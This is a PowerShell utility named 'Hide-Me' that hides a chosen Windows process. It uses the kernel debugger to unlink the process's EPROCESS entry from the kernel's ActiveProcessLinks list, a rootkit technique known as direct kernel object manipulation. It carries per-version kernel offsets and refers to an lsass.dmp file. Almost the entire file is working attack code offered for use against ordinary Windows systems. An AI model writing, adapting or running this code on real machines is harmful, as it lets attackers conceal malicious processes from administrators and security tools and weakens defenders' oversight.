<#
.SYNOPSIS 
PowerProcess utility to hide a target process
 
.DESCRIPTION 
This utility try to hide a target process.
This utility must be run with elevated permissions. 
We need the /debug mode switch to on (bcdedit.exe /debug on)

.EXAMPLE 
PS > Hide-Me -Process cmd.exe

Windows 7, 8, 10 supported (64 bits)

#>


[CmdletBinding()]
param (
    [Parameter(Mandatory=$true, ValueFromPipelineByPropertyName=$true, Position=0)]        
        [string] $Process
)

#---------------------------------------------------------[Initialisations]--------------------------------------------------------

Set-StrictMode -version 2

$scriptPath = split-path -parent $MyInvocation.MyCommand.Definition
$scriptParentPath = split-path -parent $scriptPath
$scriptFile = $MyInvocation.MyCommand.Definition
$launchDate = get-date -f "yyyyMMddHHmmss"
$logDirectoryPath = $scriptParentPath + "\" + $launchDate
$file = "$logDirectoryPath\lsass.dmp"
$buffer = "$scriptPath\bufferCommand.txt"
$fullScriptPath = (Resolve-Path -Path $buffer).Path

#----------------------------------------------------------[Declarations]----------------------------------------------------------

$kd = "$scriptPath\x64\kd.exe"
$symbols = "srv*c:\symbols*http://msdl.microsoft.com/download/symbols"
$utilityFunctions = "$scriptPath\Get-Utilities.ps1"

#----------------------------------------------------------[Functions]-------------------------------------------------------------

. $utilityFunctions

#----------------------------------------------------------[Execution]-------------------------------------------------------------

$operatingSystem = (Get-WmiObject Win32_OperatingSystem).version
$osArchitecture =  (Get-WmiObject Win32_OperatingSystem).OSArchitecture

$mode = Get-OperatingSystemMode $operatingSystem $osArchitecture
$symfix = ""
Switch ($mode) {
    "1" { 
            $offset = "208"
            $sidHashOffset = "+0x0e0+0x010"
            $activeProcessLinksOffset = "0x188"
        }
    "132" { 
            $offset = "f8"
            $sidHashOffset = "+0x0e0+0x010"
            $activeProcessLinksOffset = ""
        }
    "2" { 
            $offset = "348"
            $sidHashOffset = "+0x0e8+0x010"
            $activeProcessLinksOffset = "0x2e8"
        }
    "8.1" {# to do
        }
    "2r2" {# to do
        }
    "232" {# to do
        }
    "2016" { 
            $offset = "358"
            $sidHashOffset = "+0x0e8+0x010"
            #   +0x2f0 ActiveProcessLinks : _LIST_ENTRY
            $activeProcessLinksOffset = "0x2f0"
        }
    "1014342" {
            $offset = "358"
            $sidHashOffset = "+0x0e8+0x010"
            #   +0x2f0 ActiveProcessLinks : _LIST_ENTRY
            $activeProcessLinksOffset = "0x2f0"
            $symfix = ".symfix
.reload /f nt"
    }
}

Write-Output "Trying to hide the process $Process"

$chain = "$symfix
!process 0 0 $Process"
Write-InFile $buffer "$chain"
$tabSystem = Call-MemoryWalker $kd $file $fullScriptPath $symbols
$tabFA = ($tabSystem -split ' ')                   
$fi = [array]::indexof($tabFA,"PROCESS") + 1
$processAddress = $tabFA[$fi]
Write-Output "$Process memory address found! ($processAddress)"

$chain = "$symfix
dt nt!_eprocess ActiveProcessLinks. ImageFileName $processAddress"
Write-InFile $buffer "$chain"
$tabSystem = Call-MemoryWalker $kd $file $fullScriptPath $symbols
$tabFA = ($tabSystem -split ' ')   
$fi = [array]::indexof($tabFA,"[") + 1
$FLINK = $tabFA[$fi]
$fi = [array]::indexof($tabFA,"]") - 1
$BLINK = $tabFA[$fi]

$chain = "$symfix
dt nt!_eprocess ActiveProcessLinks.Blink ImageFileName $processAddress"
Write-InFile $buffer "$chain"
$tabSystem = Call-MemoryWalker $kd $file $fullScriptPath $symbols
$tabFA = ($tabSystem -split ' ')                 
$fi = [array]::indexof($tabFA,"_LIST_ENTRY") + 2
$thisProcessLinks = $tabFA[$fi]

# update flink of previous process to flink of target process
$chain = "$symfix
f $BLINK L4 0x$($FLINK.Substring(17,2)) 0x$($FLINK.Substring(15,2)) 0x$($FLINK.Substring(13,2)) 0x$($FLINK.Substring(11,2))"
Write-InFile $buffer "$chain"
$res = Call-MemoryWalker $kd $file $fullScriptPath $symbols
# Update blink of next process to blink of of target process
$chain = "$symfix
f $FLINK+0x8 L4 0x$($BLINK.Substring(17,2)) 0x$($BLINK.Substring(15,2)) 0x$($BLINK.Substring(13,2)) 0x$($BLINK.Substring(11,2))"
Write-InFile $buffer "$chain"
$res = Call-MemoryWalker $kd $file $fullScriptPath $symbols

# update links of target process to itself
# it is necessary to get the links valid in case of API will use this links 
# (eg when process exits, the process manager removes it from the process list)
# if it is not done -> BSOD :-)
$chain = "$symfix
f $thisProcessLinks L4 0x$($thisProcessLinks.Substring(17,2)) 0x$($thisProcessLinks.Substring(15,2)) 0x$($thisProcessLinks.Substring(13,2)) 0x$($thisProcessLinks.Substring(11,2))"
Write-InFile $buffer "$chain"
$res = Call-MemoryWalker $kd $file $fullScriptPath $symbols
$chain = "$symfix
f $thisProcessLinks+0x8 L4 0x$($thisProcessLinks.Substring(17,2)) 0x$($thisProcessLinks.Substring(15,2)) 0x$($thisProcessLinks.Substring(13,2)) 0x$($thisProcessLinks.Substring(11,2))"
Write-InFile $buffer "$chain"
$res = Call-MemoryWalker $kd $file $fullScriptPath $symbols


Write-Output "$Process is hidden"